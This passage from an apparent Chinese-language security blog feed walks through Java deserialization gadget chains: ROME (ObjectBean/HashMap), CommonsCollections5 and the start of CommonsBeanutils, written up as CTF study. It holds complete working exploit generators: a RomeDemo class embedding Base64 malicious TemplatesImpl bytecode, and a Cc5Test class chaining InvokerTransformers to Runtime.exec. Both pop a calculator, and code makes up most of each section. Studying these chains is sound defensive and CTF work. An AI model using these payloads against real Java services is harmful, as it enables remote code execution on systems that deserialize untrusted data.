class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可成功触发计算器。</p><h4 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码"></a>关键代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ObjectBean</span> <span class="hljs-variable">delegate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(Templates.class, templates);<br>  delegate.toString();<br></code></pre></td></tr></table></figure><p>接下来就要思考如何加入<strong>反序列化</strong>。</p><h2 id="ObjectBean-hashCode"><a href="#ObjectBean-hashCode" class="headerlink" title="ObjectBean#hashCode"></a>ObjectBean#hashCode</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061420042.png" alt="QQ截图20220306114759"></p><p>跟进<strong>beanHashCode()</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061206491.png" alt="QQ截图20220306114855"></p><p>然后我们就要考虑这里怎么回调到<strong>ObjectBean#toString</strong>？事实上我们可以进行多重封装。比如这样。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ObjectBean</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ObjectBean.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(String.class, <span class="hljs-string">&quot;xsw6a&quot;</span>));<br></code></pre></td></tr></table></figure><p>这样我们不仅调用了<strong>ObjectBean#hashCode</strong>还调用了<strong>ObjectBean#toString</strong>。为了避免在序列化之前就弹出计算器。我们可以在put进map中之后在进行<strong>反射</strong>修改值就可以了。</p><h2 id="HashMap-readObject"><a href="#HashMap-readObject" class="headerlink" title="HashMap#readObject"></a>HashMap#readObject</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061420627.png" alt="QQ截图20220306134313"><br>跟进hash。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061343916.png" alt="QQ截图20220306134328"><br>这里会调用**key.hashCode()**。<br>这里得key可以控制。那么我们一条完整得链子就出来了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RomeDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">delegate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(Templates.class, templates);<br><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ObjectBean.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(String.class, <span class="hljs-string">&quot;xsw6a&quot;</span>));<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(root, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;xsw6a&quot;</span>, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br><br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> ObjectBean.class.getDeclaredField(<span class="hljs-string">&quot;_equalsBean&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(root, <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ObjectBean.class, delegate));<br><br>        serialize(map);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonCollections5</title>
    <link href="/2022/03/05/CommonCollections5/"/>
    <url>/2022/03/05/CommonCollections5/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonCollections5"><a href="#CommonCollections5" class="headerlink" title="CommonCollections5"></a>CommonCollections5</h1><p>还是再看rome链，看到有利用<strong>BadAttributeValueExpException</strong>就想起cc5。借此复习下吧。</p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream.readObject()<br>            BadAttributeValueExpException.readObject()<br>                TiedMapEntry.toString()<br>                    LazyMap.get()<br>                        ChainedTransformer.transform()<br>                            ConstantTransformer.transform()<br>                            InvokerTransformer.transform()<br>                                Method.invoke()<br>                                    Class.getMethod()<br>                            InvokerTransformer.transform()<br>                                Method.invoke()<br>                                    Runtime.getRuntime()<br>                            InvokerTransformer.transform()<br>                                Method.invoke()<br>                                    Runtime.exec()<br></code></pre></td></tr></table></figure><h2 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h2><p>值得注意的三个个地方。<img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203052221266.png" alt="QQ截图20220305220944"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203052221136.png" alt="QQ截图20220305220912"></p><p>在调用<strong>toString</strong>的时候会跑到<strong>getValue（）</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203052221203.png" alt="QQ截图20220305221112"></p><p>然后调用<strong>get</strong>，这里就跟LazyMap后面的链子差不多。<br>下面就要找反序列化的点。</p><h1 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h1><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203052221228.png" alt="QQ截图20220305221328"></p><p>可以通过反射构造。那么一条完整的链子就出来了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc5Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorate</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(decorate,<span class="hljs-number">123</span>);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException,tiedMapEntry);<br>       serialize(badAttributeValueExpException);<br>       unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cc链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsBeanutils（无cc依赖）</title>
    <link href="/2022/03/05/CommonsBeanutils%EF%BC%88%E6%97%A0cc%E4%BE%9D%E8%B5%96%EF%BC%89/"/>
    <url>/2022/03/05/CommonsBeanutils%EF%BC%88%E6%97%A0cc%E4%BE%9D%E8%B5%96%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="ROME"><a href="#ROME" class="headerlink" title="ROME"></a>ROME</h1><p>昨天做到D3CTF比赛的一道题，emmm白卷一晚上。后面看是ROME，然后看了看网上的ROME链，要用到<strong>CommonsBeanutils</strong>，今天就来复习下<strong>CommonsBeanutils</strong>。</p><h2 id="CommonsBeanutils"><a href="#CommonsBeanutils" class="headerlink" title="CommonsBeanutils"></a>CommonsBeanutils</h2><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;project xmlns=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br>         xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>         xsi:schemaLocation=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;<br>    &lt;modelVersion&gt;<span class="hljs-number">4.0</span><span class="hljs-number">.0</span>&lt;/modelVersion&gt;<br><br>    &lt;groupId&gt;org.example&lt;/groupId&gt;<br>    &lt;artifactId&gt;commonsbeanutils&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">1.0</span>-SNAPSHOT&lt;/version&gt;<br><br>    &lt;properties&gt;<br>        &lt;maven.compiler.source&gt;<span class="hljs-number">8</span>&lt;/maven.compiler.source&gt;<br>        &lt;maven.compiler.target&gt;<span class="hljs-number">8</span>&lt;/maven.compiler.target&gt;<br>    &lt;/properties&gt;<br>    &lt;dependencies&gt;<br>        &lt;dependency&gt;<br>            &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;<br><br>        &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;<br><br>        &lt;version&gt;<span class="hljs-number">1.8</span><span class="hljs-number">.3</span>&lt;/version&gt;<br>        &lt;/dependency&gt;<br><br>        &lt;dependency&gt;<br><br>            &lt;groupId&gt;org.javassist&lt;/groupId&gt;<br><br>            &lt;artifactId&gt;javassist&lt;/artifactId&gt;<br><br>            &lt;version&gt;<span class="hljs-number">3.21</span><span class="hljs-number">.0</span>-GA&lt;/version&gt;<br><br>        &lt;/dependency&gt;<br>    &lt;/dependencies&gt;<br>&lt;/project&gt;<br></code></pre></td></tr></table></figure><p>跟着p神走。<br>commons-beanutils中提供了这样一个方法。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051437577.png" alt="QQ截图20220305143634"></p><p>简单来说就是可以读取属性中的读方法即getName方法。当然这里要满足特殊的命名方式。getN(大写)ame。</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaBean</span> &#123;<br>   <span class="hljs-keyword">private</span> String name=<span class="hljs-string">&quot;xsw6a&quot;</span>;<br>   <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title 